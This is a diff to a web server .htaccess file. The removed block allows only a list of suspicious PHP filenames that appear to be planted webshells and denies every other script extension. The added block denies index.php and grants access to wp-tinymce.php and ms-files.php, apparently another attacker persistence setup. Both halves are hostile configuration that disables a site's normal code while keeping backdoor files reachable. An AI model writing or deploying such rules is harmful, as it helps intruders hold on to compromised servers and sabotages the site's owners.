@@ -1,31 +1,27 @@
-<IfModule mod_rewrite.c>
-    <IfModule mod_negotiation.c>
-        Options -MultiViews -Indexes
-    </IfModule>
-
-    RewriteEngine On
-
-    # Handle Authorization Header
-    RewriteCond %{HTTP:Authorization} .
-    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]
-
-    # Redirect Trailing Slashes If Not A Folder...
-    RewriteCond %{REQUEST_FILENAME} !-d
-    RewriteCond %{REQUEST_URI} (.+)/$
-    RewriteRule ^ %1 [L,R=301]
-
-    # Send Requests To Front Controller...
-    RewriteCond %{REQUEST_FILENAME} !-d
-    RewriteCond %{REQUEST_FILENAME} !-f
-    RewriteRule ^ index.php [L]
-</IfModule>
-
-<FilesMatch ".(php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PhP7|alfa|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|alfa|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|suspected)$">
-Order allow,deny
-deny from all
+<FilesMatch "\.(index.php)$">
+  <IfModule !mod_authz_core.c>
+    Order allow,deny
+    Deny from all
+  </IfModule>
+  <IfModule mod_authz_core.c>
+    Require all denied
+  </IfModule>
 </FilesMatch>
 
-<FilesMatch "^(index.php|folter.php|default.php|wp-files.php|db-file.php|rimuru.php|inc.php|autocompleter.php|Pacifico-webfont.php|template.php|admin-history-versions.min.js.php|OM001-2025-0ba20b8bed5f34af755e12ed2a2831c8-1816-.php|pepa_abalos_vivienda_pah.jpg.php|Batman-The-Telltale-Series-Art-Wallpaper_easy.php|tags.php|mod_articles.php|helder.php|view_peserta_verifikasi.php|eE-GB.plg_system_helixultimate.php|confing.php|rangga.php)$">
-    Order Allow,Deny
+<Files wp-tinymce.php>
+  <IfModule !mod_authz_core.c>
     Allow from all
-</FilesMatch>
+  </IfModule>
+  <IfModule mod_authz_core.c>
+    Require all granted
+  </IfModule>
+</Files>
+
+<Files ms-files.php>
+  <IfModule !mod_authz_core.c>
+    Allow from all
+  </IfModule>
+  <IfModule mod_authz_core.c>
+    Require all granted
+  </IfModule>
+</Files>
